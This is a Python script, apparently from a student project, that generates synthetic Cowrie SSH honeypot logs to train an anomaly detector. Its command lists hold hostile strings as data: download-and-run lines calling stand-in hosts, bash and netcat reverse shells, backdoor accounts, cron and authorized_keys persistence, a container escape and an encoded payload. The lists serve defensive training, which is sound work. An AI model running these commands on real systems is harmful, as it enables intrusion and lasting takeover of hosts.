"""
ssh_log_generator.py — Honeypot Intelligent
=============================================
Synthetic Cowrie SSH log generator for cold-start model training.

Writes Cowrie-format JSON events directly to cowrie.json so the collector
picks them up through the normal pipeline — no mock or stub involved.

Three operating modes (set via MODE env var):
    normal     — legitimate SSH sessions only
    suspicious — attack sessions only
    mixed      — 60% normal + 40% suspicious  [default]

Suspicious sessions include cowrie.command.failed events to simulate
attackers attempting commands that Cowrie's emulator does not support
(privilege escalation tools, obfuscated payloads, container escapes).
These events are only detectable by Isolation Forest, not by expert rules,
making them valuable for ML-only anomaly training.

Author  : Hafsa Daoudim
Project : Final Training Project — JobInTech 2026
"""

import os
import json
import time
import random
from datetime import datetime, timezone

# ── Configuration — overridable via environment variables ─────────────────────
OUT   = os.getenv("OUT",   "/cowrie/var/log/cowrie/cowrie.json")
COUNT = int(os.getenv("COUNT", "300"))   # Number of SSH sessions to simulate
MODE  = os.getenv("MODE",  "mixed")     # normal | suspicious | mixed

# ── Credential pools ──────────────────────────────────────────────────────────
USERS_NORMAL = ["user", "ubuntu", "pi", "testuser", "alice"]  # Low-risk usernames
USERS_SUSP   = ["root", "admin", "administrator", "oracle", "postgres", "test", "guest"]
COMMON_PASS  = ["123456", "admin", "password", "root", "oracle123", "123qwe"]

# ── Command pools ─────────────────────────────────────────────────────────────

# Benign commands — produce low-threat feature vectors
NORMAL_COMMANDS = [
    "pwd", "ls", "ls -la", "whoami", "id", "echo $PATH",
    "uptime", "df -h", "free -m", "cat /etc/hostname", "history", "exit"
]

SUSPICIOUS_COMMANDS = [
    # Reconnaissance — triggers has_recon in featurize_ssh_cowrie
    "uname -a", "cat /etc/passwd", "cat /proc/cpuinfo",
    "netstat -tuln", "ps aux | grep sshd", "who", "last",
    "find / -name *.php", "ip a", "ifconfig",
    # Post-exploitation — triggers has_post_exploitation
    "wget http://evil.com/m.sh",
    "curl -fsSL http://malware.org/payload | sh",
    "chmod +x /tmp/*.sh",
    "cd /tmp; wget http://attacker.ru/bot; chmod +x bot; ./bot",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",   # Reverse shell
    "nc -e /bin/sh 10.0.0.1 4444",
    "python -c 'import socket,subprocess,os; ...'",
    # Privilege escalation — triggers has_privesc
    "sudo su -", "sudo bash", "su root",
    "useradd -m -s /bin/bash backdoor; echo backdoor:toor | chpasswd",
    "usermod -aG sudo backdoor",
    "chmod u+s /bin/bash",
    "chown root /tmp/shell; chmod u+s /tmp/shell",
    "visudo",
    # Persistence — triggers has_persistence
    "echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys",
    "crontab -e",
    "echo '* * * * * /tmp/bot' | crontab -",
    "systemctl enable malware.service",
    "echo '/tmp/bot &' >> ~/.bashrc",
    "echo '/tmp/bot &' >> ~/.profile",
    "cp /tmp/bot /etc/init.d/bot && chmod +x /etc/init.d/bot",
]

# Commands that Cowrie cannot emulate → generate cowrie.command.failed events.
# These are detectable only by Isolation Forest (not by expert rules), making
# them critical for training the ML model to recognize real-attacker behavior.
FAILED_COMMANDS = [
    # Privilege escalation tools unknown to Cowrie
    "useradd -m -s /bin/bash backdoor",
    "usermod -aG sudo hacker",
    "visudo -f /etc/sudoers",
    "chmod u+s /bin/bash",
    "chown root:root /tmp/exploit",
    "setuid /tmp/shell",
    # Persistence via unknown services
    "systemctl enable malware.service",
    "systemctl start backdoor.service",
    "apt-get install -y netcat",
    "yum install -y wget",
    "docker run --privileged -v /:/host alpine chroot /host",  # Container escape
    "crontab -l | grep -v bot | crontab -",
    # Obfuscated / encoded payloads
    "$(curl http://evil.com/shell.sh)",
    "eval $(echo 'd2dldCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2g=' | base64 -d)",
    "python3 -c 'import os; os.system(\"id\")'",
    "perl -e 'system(\"wget http://evil.com/bot\")'",
]


# ── Helpers ───────────────────────────────────────────────────────────────────

def now_iso() -> str:
    """Return the current UTC timestamp in ISO 8601 format (Cowrie-compatible)."""
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def write_event(ev: dict):
    """Append one JSON event to the Cowrie log file (one event per line)."""
    with open(OUT, "a", encoding="utf-8") as f:
        f.write(json.dumps(ev) + "\n")


# ── Session generator ─────────────────────────────────────────────────────────

def generate_session(session_id: int):
    """
    Simulate one complete SSH session and write all events to cowrie.json.

    Session structure:
        1. cowrie.session.connect
        2. N × cowrie.login.failed  (brute-force if suspicious)
        3. cowrie.login.success     (70% chance even for suspicious sessions)
        4. M × cowrie.command.input
        5. [optional] K × cowrie.command.failed  (suspicious sessions only, 50% chance)
        6. cowrie.session.disconnect

    Source IPs are randomized per session (172.30.0.x range) to avoid
    single-IP bias in the frequency features of the trained model.
    """
    # Randomize source IP per session — prevents frequency feature bias
    src_ip   = f"172.30.0.{random.randint(1, 254)}"
    session  = f"session_{session_id:04d}"
    user     = random.choice(USERS_NORMAL + USERS_SUSP)
    is_suspicious = (MODE == "suspicious") or (MODE == "mixed" and random.random() < 0.4)

    # 1) Session open
    write_event({
        "timestamp": now_iso(), "eventid": "cowrie.session.connect",
        "src_ip": src_ip, "session": session,
        "src_port": random.randint(1024, 65535)
    })

    # 2) Login attempts — suspicious sessions try multiple passwords (brute-force)
    attempts = random.randint(1, 8) if is_suspicious else 1
    for _ in range(attempts - 1):
        write_event({
            "timestamp": now_iso(), "eventid": "cowrie.login.failed",
            "src_ip": src_ip, "session": session,
            "username": user,
            "password": random.choice(COMMON_PASS + ["wrongpass123", "12345678"])
        })
        time.sleep(random.uniform(0.1, 1.2))

    # 3) Login result — most sessions succeed to generate rich command data
    success = not is_suspicious or random.random() < 0.7
    if success:
        write_event({
            "timestamp": now_iso(), "eventid": "cowrie.login.success",
            "src_ip": src_ip, "session": session,
            "username": user,
            "password": random.choice(COMMON_PASS) if is_suspicious else "userpass"
        })

        # 4) Command sequence — suspicious sessions run more and riskier commands
        nb_cmds = random.randint(3, 18) if is_suspicious else random.randint(1, 6)
        cmds    = SUSPICIOUS_COMMANDS if is_suspicious else NORMAL_COMMANDS

        for _ in range(nb_cmds):
            write_event({
                "timestamp": now_iso(), "eventid": "cowrie.command.input",
                "src_ip": src_ip, "session": session,
                "username": user, "input": random.choice(cmds)
            })
            time.sleep(random.uniform(0.3, 3.5))

        # 5) Failed commands (suspicious sessions only, 50% probability).
        # Simulates a real attacker using tools Cowrie cannot emulate.
        # These generate cowrie.command.failed events — detectable only by
        # Isolation Forest, not by the expert-rule classifier.
        if is_suspicious and random.random() < 0.5:
            for _ in range(random.randint(1, 4)):
                cmd = random.choice(FAILED_COMMANDS)
                write_event({
                    "timestamp": now_iso(), "eventid": "cowrie.command.failed",
                    "src_ip": src_ip, "session": session,
                    "username": user, "input": cmd,
                    "message": f"Command not found: {cmd}",
                })
                time.sleep(random.uniform(0.2, 2.0))

    # 6) Session close
    write_event({
        "timestamp": now_iso(), "eventid": "cowrie.session.disconnect",
        "src_ip": src_ip, "session": session
    })


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    """
    Generate COUNT SSH sessions at randomized intervals.
    Variable inter-session delays produce a realistic fails_60s distribution
    in the training data — avoids artificially inflating the frequency feature.
    """
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    print(f"[gen_ssh] mode={MODE}  count={COUNT}  output={OUT}")

    for i in range(COUNT):
        generate_session(i)
        time.sleep(random.uniform(0.5, 4.0))
        if (i + 1) % 50 == 0:
            print(f"[gen_ssh] {i + 1}/{COUNT} sessions written")

    print("[gen_ssh] done.")


if __name__ == "__main__":
    main()